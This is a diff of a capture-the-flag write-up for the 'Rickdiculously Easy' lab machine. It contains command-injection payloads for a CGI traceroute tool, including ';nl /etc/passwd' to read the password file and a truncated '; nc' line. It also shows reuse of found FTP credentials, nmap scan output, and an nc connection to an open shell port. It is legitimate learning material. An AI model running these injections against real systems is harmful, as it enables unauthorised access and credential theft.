@@ -155,8 +155,9 @@ Go to `http://10.0.0.137/cgi-bin/tracertool.cgi` and in the dialog box put `; nc
 You can also print out the `/etc/passwd` with the tracertool by placing `;nl /etc/passwd` in the dialog box
 
 ![Optional Text](/Rickdiculously%20Easy/_resources/6a8dee2210714497bd66728abccf025e.png)
+
+**Great now we have some usernames!**
 ```
-Great now we have some usernames
 27 RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
 28 Morty:x:1001:1001::/home/Morty:/bin/bash
 29 Summer:x:1002:1002::/home/Summer:/bin/bash
@@ -166,7 +167,7 @@ My guess is the password we found early `winter` has to belong to one of these u
 
 ## FTP Login
 
-After using creds **Summer:winter** I was able to get an FTP login and our next FLAG. **40 points found and 90 left to go!**
+After using the credentials **Summer:winter** I was able to get an FTP login and our next FLAG. **40 points found and 90 left to go!**
 
 ![Optional Text](/Rickdiculously%20Easy/_resources/33bd2ec1b02544c698bae44d6cef7f85.png)
 
@@ -183,7 +184,7 @@ Listing out the contents of Rick & Morty's home dir I see some interesting files
 
 `ls /home/Morty`
 
-I used filezilla to move files over.To unzip the file I need a password for the journal.txt.zip found in Morty's home dir. Not knowing the password I figured there was more. I moved onto the contents of Rick's home Dir. First Looking at the `RICKS_SAFE` dir. Inside there was an exe named `safe` and another directory `ThisDoesntContainAnyFlags`. Inside `ThisDoesntContainAnyFlags`  was a file called `NotAFlag.txt`. I wasn't able to run the exe even after moving the file to my machine unless I installed a libmcrypt. I didn't want to do that plus I figured I was missing something at this point!
+I used filezilla to move files over. To unzip the file I need a password for the journal.txt.zip found in Morty's home dir. Not knowing the password I figured there was more. I moved onto the contents of Rick's home Dir. First Looking at the `RICKS_SAFE` dir. Inside there was an exe named `safe` and another directory `ThisDoesntContainAnyFlags`. Inside `ThisDoesntContainAnyFlags`  was a file called `NotAFlag.txt`. I wasn't able to run the exe even after moving the file to my machine unless I installed a libmcrypt. I didn't want to do that plus I figured I was missing something at this point!
 
 Contents of `NotAFlag.txt`
 
@@ -194,7 +195,54 @@ But seriously this isn't a flag..
 I looked over all my notes from the machine and decided to do a little more enumeration. The first thing I did was run a full port nmap scan.
 ![Optional Text](/Rickdiculously%20Easy/_resources/a6df27299520dc839dc8c3c5fb6ac8e9.png)
 
-After running the scan I see several ports that I didn't seem before! So I decided to run nmap again but with a few more informational flags. In a real world enviroment, its not a good idea to run namp with `-T5`. It will get you caught!
+After running the scan I see several ports that I didn't see before, oops! So I ran `nmap -sC -sV -sS -p 13337,22222,60000 10.0.0.137`.
+In a real world enviroment, its not a good idea to run nmap with `-T5`. It will get you caught!
+
+### Output from `nmap -sC -sV -sS -p 13337,22222,60000 10.0.0.137`
+```
+Nmap scan report for 10.0.0.137
+Host is up (0.00023s latency).
+
+PORT      STATE SERVICE VERSION
+13337/tcp open  unknown
+| fingerprint-strings: 
+|   NULL: 
+|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
+22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
+|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
+|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
+60000/tcp open  unknown
+|_drda-info: ERROR
+| fingerprint-strings: 
+|   NULL, ibm-db2: 
+|_    Welcome to Ricks half baked reverse shell...
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port13337-TCP:V=7.80%I=7%D=5/1%Time=608DB7D9%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port60000-TCP:V=7.80%I=7%D=5/1%Time=608DB7DF%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.\
+SF:.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20rev
+SF:erse\x20shell\.\.\.\n#\x20");
+MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.71 seconds
+
+```
+Another Flag! `FLAG:{TheyFoundMyBackDoorMorty}-10Points` **50 Points found 80 Left!**
+Noticing the odd text under **NEXT SERVICE FINGERPRINT**
+
+### Odd Text
+```
+"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.\ SF:.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20rev SF:erse\x20shell\.\.\.\n#\x20");
+```
+Mhhmmm!! Did Rick leave a Reverse Shell Open? 
+
+I used `nc 10.0.0.137 60000`
 
 
 I attempted to unzip the file but 
